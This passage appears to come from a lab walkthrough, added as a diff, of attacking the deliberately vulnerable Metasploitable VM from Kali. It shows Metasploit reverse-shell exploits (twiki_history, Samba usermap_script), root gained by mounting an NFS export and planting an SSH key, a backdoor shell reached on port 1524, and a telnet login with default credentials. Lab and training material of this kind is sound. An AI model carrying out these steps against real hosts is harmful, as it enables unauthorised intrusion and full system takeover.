+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(twiki_history) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(twiki_history) > exploit 
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Successfully sent exploit request
+[*] Command: echo 9kVZ0tE42dqKRQAv;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Command: echo TGQ7NDvwd0QnmEHc;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "9kVZ0tE42dqKRQAv\r\n"
+[*] Matching...
+[*] A is input...
+[*] Reading from socket B
+[*] B: "TGQ7NDvwd0QnmEHc\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 4 opened (192.168.174.137:4444 -> 192.168.174.132:57900) at 2016-01-25 18:46:24 -0500
+[*] Command shell session 5 opened (192.168.174.137:4444 -> 192.168.174.132:57902) at 2016-01-25 18:46:24 -0500
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+hostname
+metasploitable
+
+8.) Enumerating port - 2049/tcp - nfs - 2-4 (RPC #100003)
+Run enum4linux
+root@kali:~# enum4linux 192.168.174.132
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan 25 18:20:26 2016
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.174.132
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+<--- snip --->
+ ============================================ 
+|    Share Enumeration on 192.168.174.132    |
+ ============================================ 
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+
+	Server               Comment
+	---------            -------
+	METASPLOITABLE       metasploitable server (Samba 3.0.20-Debian)
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE
+
+[+] Attempting to map shares on 192.168.174.132
+//192.168.174.132/print$	Mapping: DENIED, Listing: N/A
+//192.168.174.132/tmp	Mapping: OK, Listing: OK
+//192.168.174.132/opt	Mapping: DENIED, Listing: N/A
+//192.168.174.132/IPC$	[E] Can't understand response:
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+//192.168.174.132/ADMIN$	Mapping: DENIED, Listing: N/A
+<--- snip --->
+ ================================================ 
+|    Getting printer info for 192.168.174.132    |
+ ================================================ 
+No printers returned.
+
+
+enum4linux complete on Mon Jan 25 18:20:31 2016
+
+root@kali:~# 
+
+root@kali:~# rpcinfo -p 192.168.174.132
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  46517  status
+    100024    1   tcp  53833  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  50289  nlockmgr
+    100021    3   udp  50289  nlockmgr
+    100021    4   udp  50289  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  59176  nlockmgr
+    100021    3   tcp  59176  nlockmgr
+    100021    4   tcp  59176  nlockmgr
+    100005    1   udp  46778  mountd
+    100005    1   tcp  56557  mountd
+    100005    2   udp  46778  mountd
+    100005    2   tcp  56557  mountd
+    100005    3   udp  46778  mountd
+    100005    3   tcp  56557  mountd
+    
+root@kali:~# showmount -e 192.168.174.132
+Export list for 192.168.174.132:
+/ *
+
+root@kali:~# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+b9:9f:9f:28:3d:38:b1:8e:ec:1a:6d:57:12:c7:23:c3 root@kali
+The key's randomart image is:
++--[ RSA 2048]----+
+|                 |
+|       . .       |
+|        E +      |
+|         * .     |
+|        S .      |
+|     .  .+       |
+|    . o o=       |
+|     + o=.oo .   |
+|    .o+..o+oo    |
++-----------------+
+root@kali:~# mkdir /tmp/r00t
+
+root@kali:~# mount -t nfs 192.168.174.132:/ /tmp/r00t/
+mount.nfs: rpc.statd is not running but is required for remote locking.
+mount.nfs: Either use '-o nolock' to keep locks local, or start statd.
+mount.nfs: an incorrect mount option was specified
+
+root@kali:~# mount -t nfs 192.168.174.132:/ /tmp/r00t/ -o nolock
+
+root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
+
+root@kali:~# umount /tmp/r00t
+
+root@kali:~# ssh root@192.168.174.132
+Last login: Wed Jan 27 13:41:20 2016 from :0.0
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+root@metasploitable:~# 
+
+9.) Enumerating port 1524/tcp - shell - Metasploitable root shell
+root@kali:~# nc 192.168.174.132 1524
+root@metasploitable:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:/# 
+
+10.) Enumerating port 23/tcp - telnet - Linux telnetd
+In msf
+msf > search telnet
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                Disclosure Date  Rank       Description
+   ----                                                ---------------  ----       -----------
+   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
+   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+   auxiliary/scanner/telnet/lantronix_telnet_password                   normal     Lantronix Telnet Password Recovery
+   auxiliary/scanner/telnet/lantronix_telnet_version                    normal     Lantronix Telnet Service Banner Detection
+   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal     Telnet Service Encyption Key ID Overflow Detection
+   auxiliary/scanner/telnet/telnet_login                                normal     Telnet Login Check Scanner
+   auxiliary/scanner/telnet/telnet_ruggedcom                            normal     RuggedCom Telnet Password Generator
+   auxiliary/scanner/telnet/telnet_version                              normal     Telnet Service Banner Detection
+   auxiliary/server/capture/telnet                                      normal     Authentication Capture: Telnet
+   exploit/freebsd/ftp/proftp_telnet_iac               2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   exploit/freebsd/telnet/telnet_encrypt_keyid         2011-12-23       great      FreeBSD Telnet Service Encryption Key ID Buffer Overflow
+   exploit/linux/ftp/proftp_telnet_iac                 2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   exploit/linux/http/dlink_diagnostic_exec_noauth     2013-03-05       excellent  D-Link DIR-645 / DIR-815 diagnostic.php Command Execution
+   exploit/linux/http/dlink_dir300_exec_telnet         2013-04-22       excellent  D-Link Devices Unauthenticated Remote Command Execution
+   exploit/linux/telnet/telnet_encrypt_keyid           2011-12-23       great      Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow
+   exploit/solaris/telnet/fuser                        2007-02-12       excellent  Sun Solaris Telnet Remote Authentication Bypass Vulnerability
+   exploit/solaris/telnet/ttyprompt                    2002-01-18       excellent  Solaris in.telnetd TTYPROMPT Buffer Overflow
+   exploit/unix/webapp/dogfood_spell_exec              2009-03-03       excellent  Dogfood CRM spell.php Remote Command Execution
+   exploit/windows/proxy/ccproxy_telnet_ping           2004-11-11       average    CCProxy Telnet Proxy Ping Overflow
+   exploit/windows/telnet/gamsoft_telsrv_username      2000-07-17       average    GAMSoft TelSrv 1.5 Username Buffer Overflow
+   exploit/windows/telnet/goodtech_telnet              2005-03-15       average    GoodTech Telnet Server Buffer Overflow
+   payload/cmd/unix/reverse                                             normal     Unix Command Shell, Double Reverse TCP (telnet)
+   payload/cmd/unix/reverse_bash_telnet_ssl                             normal     Unix Command Shell, Reverse TCP SSL (telnet)
+   payload/cmd/unix/reverse_ssl_double_telnet                           normal     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   post/windows/gather/credentials/mremote                              normal     Windows Gather mRemote Saved Password Extraction
+
+msf > use auxiliary/scanner/telnet/telnet_version 
+msf auxiliary(telnet_version) > show options 
+
+Module options (auxiliary/scanner/telnet/telnet_version):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     23               yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   TIMEOUT   30               yes       Timeout for the Telnet probe
+   USERNAME                   no        The username to authenticate as
+
+msf auxiliary(telnet_version) > set RhOSTS 192.168.174.132
+RhOSTS => 192.168.174.132
+msf auxiliary(telnet_version) > run 
+
+[*] 192.168.174.132:23 TELNET _                  _       _ _        _     _      ____  \x0a _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |\x0a| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ \x0a|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a                            |_|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(telnet_version) > 
+
+In Kali
+root@kali:~# telnet 192.168.174.132
+Trying 192.168.174.132...
+Connected to 192.168.174.132.
+Escape character is '^]'.
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+metasploitable login: msfadmin
+Password: 
+Last login: Mon Jan 25 17:14:05 EST 2016 on tty1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+msfadmin@metasploitable:~$ id
+uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+msfadmin@metasploitable:~$ 
+
+11.) Enumerating port 139/tcp - netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+                      445/tcp - netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+In msf
+msf > search smb
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                            Disclosure Date  Rank       Description
+   ----                                                            ---------------  ----       -----------
+   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     Microsoft SQL Server NTLM Stealer
+   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     Microsoft SQL Server SQLi NTLM Stealer
+   auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     Oracle SMB Relay Code Execution
+   auxiliary/admin/smb/check_dir_file                                               normal     SMB Scanner Check File/Directory Utility
+   auxiliary/admin/smb/delete_file                                                  normal     SMB File Delete Utility
+   auxiliary/admin/smb/download_file                                                normal     SMB File Download Utility
+   auxiliary/admin/smb/list_directory                                               normal     SMB Directory Listing Utility
+   auxiliary/admin/smb/psexec_command                                               normal     Microsoft Windows Authenticated Administration Utility
+   auxiliary/admin/smb/psexec_ntdsgrab                                              normal     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   auxiliary/admin/smb/samba_symlink_traversal                                      normal     Samba Symlink Directory Traversal
+   auxiliary/admin/smb/upload_file                                                  normal     SMB File Upload Utility
+   auxiliary/docx/word_unc_injector                                                 normal     Microsoft Word UNC Path Injector
+   auxiliary/dos/samba/read_nttrans_ea_list                                         normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     SAP SOAP EPS_DELETE_FILE File Deletion
+   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     Microsoft Plug and Play Service Registry Overflow
+   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     Microsoft SRV.SYS Mailslot Write Corruption
+   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     Microsoft SRV.SYS Pipe Transaction No Null
+   auxiliary/dos/windows/smb/ms09_001_write                                         normal     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
+   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
+   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     Microsoft Windows Browser Pool DoS
+   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     Microsoft Vista SP0 SMB Negotiate Protocol DoS
+   auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal     SMB Negotiate SMB2 Dialect Corruption
+   auxiliary/fuzzers/smb/smb_create_pipe                                            normal     SMB Create Pipe Request Fuzzer
+   auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal     SMB Create Pipe Request Corruption
+   auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal     SMB Negotiate Dialect Corruption
+   auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal     SMB NTLMv1 Login Request Corruption
+   auxiliary/fuzzers/smb/smb_tree_connect                                           normal     SMB Tree Connect Request Fuzzer
+   auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal     SMB Tree Connect Request Corruption
+   auxiliary/gather/konica_minolta_pwd_extract                                      normal     Konica Minolta Password Extractor
+   auxiliary/scanner/sap/sap_smb_relay                                              normal     SAP SMB Relay Abuse
+   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   auxiliary/scanner/smb/pipe_auditor                                               normal     SMB Session Pipe Auditor
+   auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal     SMB Session Pipe DCERPC Auditor
+   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     Microsoft Windows Authenticated Logged In Users Enumeration
+   auxiliary/scanner/smb/smb2                                                       normal     SMB 2.0 Protocol Detection
+   auxiliary/scanner/smb/smb_enumshares                                             normal     SMB Share Enumeration
+   auxiliary/scanner/smb/smb_enumusers                                              normal     SMB User Enumeration (SAM EnumUsers)
+   auxiliary/scanner/smb/smb_enumusers_domain                                       normal     SMB Domain User Enumeration
+   auxiliary/scanner/smb/smb_login                                                  normal     SMB Login Check Scanner
+   auxiliary/scanner/smb/smb_lookupsid                                              normal     SMB SID User Enumeration (LookupSid)
+   auxiliary/scanner/smb/smb_version                                                normal     SMB Version Detection
+   auxiliary/scanner/snmp/snmp_enumshares                                           normal     SNMP Windows SMB Share Enumeration
+   auxiliary/server/capture/smb                                                     normal     Authentication Capture: SMB
+   auxiliary/server/http_ntlmrelay                                                  normal     HTTP Client MS Credential Relayer
+   auxiliary/spoof/nbns/nbns_response                                               normal     NetBIOS Name Service Spoofer
+   exploit/linux/samba/chain_reply                                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   exploit/netware/smb/lsass_cifs                                  2007-01-21       average    Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     Apple Safari file:// Arbitrary Code Execution
+   exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       excellent  Sun Java Web Start Plugin Command Line Argument Injection
+   exploit/windows/browser/java_ws_double_quote                    2012-10-16       excellent  Sun Java Web Start Double Quote Injection
+   exploit/windows/browser/java_ws_vmargs                          2012-02-14       excellent  Sun Java Web Start Plugin Command Line Argument Injection
+   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       great      MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       excellent  MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
+   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       URSoft W32Dasm Disassembler Function Buffer Overflow
+   exploit/windows/fileformat/vlc_smb_uri                          2009-06-24       great      VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
+   exploit/windows/http/generic_http_dll_injection                 2015-03-04       manual     Generic Web Application DLL Injection
+   exploit/windows/misc/hp_dataprotector_cmd_exec                  2014-11-02       excellent  HP Data Protector 8.10 Remote Command Execution
+   exploit/windows/oracle/extjob                                   2007-01-01       excellent  Oracle Job Scheduler Named Pipe Command Execution
+   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       excellent  GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   exploit/windows/smb/generic_smb_dll_injection                   2015-03-04       manual     Generic DLL Injection From Shared Resource
+   exploit/windows/smb/ms03_049_netapi                             2003-11-11       good       MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   exploit/windows/smb/ms04_007_killbill                           2004-02-10       low        MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   exploit/windows/smb/ms04_011_lsass                              2004-04-13       good       MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   exploit/windows/smb/ms04_031_netdde                             2004-10-12       good       MS04-031 Microsoft NetDDE Service Overflow
+   exploit/windows/smb/ms05_039_pnp                                2005-08-09       good       MS05-039 Microsoft Plug and Play Service Overflow
+   exploit/windows/smb/ms06_025_rasmans_reg                        2006-06-13       good       MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   exploit/windows/smb/ms06_025_rras                               2006-06-13       average    MS06-025 Microsoft RRAS Service Overflow
+   exploit/windows/smb/ms06_040_netapi                             2006-08-08       good       MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/smb/ms06_066_nwapi                              2006-11-14       good       MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   exploit/windows/smb/ms06_066_nwwks                              2006-11-14       good       MS06-066 Microsoft Services nwwks.dll Module Exploit
+   exploit/windows/smb/ms06_070_wkssvc                             2006-11-14       manual     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   exploit/windows/smb/ms07_029_msdns_zonename                     2007-04-12       manual     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
+   exploit/windows/smb/ms08_067_netapi                             2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   exploit/windows/smb/ms09_050_smb2_negotiate_func_index          2009-09-07       good       MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   exploit/windows/smb/ms10_061_spoolss                            2010-09-14       excellent  MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   exploit/windows/smb/netidentity_xtierrpcpipe                    2009-04-06       great      Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   exploit/windows/smb/psexec                                      1999-01-01       manual     Microsoft Windows Authenticated User Code Execution
+   exploit/windows/smb/psexec_psh                                  1999-01-01       manual     Microsoft Windows Authenticated Powershell Command Execution
+   exploit/windows/smb/smb_relay                                   2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution
+   exploit/windows/smb/timbuktu_plughntcommand_bof                 2009-06-25       great      Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+   post/linux/gather/mount_cifs_creds                                               normal     Linux Gather Saved mount.cifs/mount.smbfs Credentials
+   post/windows/escalate/droplnk                                                    normal     Windows Escalate SMB Icon LNK Dropper
+   post/windows/gather/credentials/gpp                                              normal     Windows Gather Group Policy Preference Saved Passwords
+   post/windows/gather/enum_shares                                                  normal     Windows Gather SMB Share Enumeration via Registry
+   post/windows/gather/netlm_downgrade                                              normal     Windows NetLM Downgrade Attack
+   post/windows/gather/word_unc_injector                                            normal     Windows Gather Microsoft Office Word UNC Path Injector
+
+
+msf > use auxiliary/scanner/smb/smb_version
+msf auxiliary(smb_version) > show options 
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf auxiliary(smb_version) > set RHOSTS 192.168.174.132
+RHOSTS => 192.168.174.132
+msf auxiliary(smb_version) > run 
+[-] Auxiliary failed: Msf::OptionValidateError The following options failed to validate: SMBDirect.
+msf auxiliary(smb_version) > set SMBDirect true
+SMBDirect => true
+msf auxiliary(smb_version) > exploit 
+[*] 192.168.174.132:445 could not be identified: Unix (Samba 3.0.20-Debian)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_version) > 
+msf > search samba
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                            Disclosure Date  Rank       Description
+   ----                                            ---------------  ----       -----------
+   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
+   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
+   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
+   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/scanner/rsync/modules_list                             normal     Rsync Unauthenticated List Command
+   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
+   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
+   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
+   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
+   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
+   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
+   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
+   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
+   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
+   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
+   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations
+
+
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > show options 
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  139              yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(usermap_script) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(usermap_script) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_awk                                    normal  Unix Command Shell, Bind TCP (via AWK)
+   cmd/unix/bind_inetd                                  normal  Unix Command Shell, Bind TCP (inetd)
+   cmd/unix/bind_lua                                    normal  Unix Command Shell, Bind TCP (via Lua)
+   cmd/unix/bind_netcat                                 normal  Unix Command Shell, Bind TCP (via netcat)
+   cmd/unix/bind_netcat_gaping                          normal  Unix Command Shell, Bind TCP (via netcat -e)
+   cmd/unix/bind_netcat_gaping_ipv6                     normal  Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/bind_zsh                                    normal  Unix Command Shell, Bind TCP (via Zsh)
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_awk                                 normal  Unix Command Shell, Reverse TCP (via AWK)
+   cmd/unix/reverse_lua                                 normal  Unix Command Shell, Reverse TCP (via Lua)
+   cmd/unix/reverse_netcat                              normal  Unix Command Shell, Reverse TCP (via netcat)
+   cmd/unix/reverse_netcat_gaping                       normal  Unix Command Shell, Reverse TCP (via netcat -e)
+   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_php_ssl                             normal  Unix Command Shell, Reverse TCP SSL (via php)
+   cmd/unix/reverse_python                              normal  Unix Command Shell, Reverse TCP (via Python)
+   cmd/unix/reverse_python_ssl                          normal  Unix Command Shell, Reverse TCP SSL (via python)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
